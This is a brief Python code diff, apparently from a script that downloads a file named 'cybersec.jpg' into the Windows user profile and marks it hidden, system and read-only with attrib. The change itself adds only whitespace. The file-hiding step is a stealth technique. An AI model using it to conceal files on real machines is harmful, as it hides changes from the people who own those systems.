@@ -14,8 +14,10 @@ def background():
     home = os.getenv("USERPROFILE")
     filename = f"{home}\\cybersec.jpg"
     os.system(f"attrib +h +s +r {filename}")
+    
     if os.path.exists(filename):
         pass
+        
     else:
         response = requests.get(url, allow_redirects=True)
         if response.status_code <= 400:
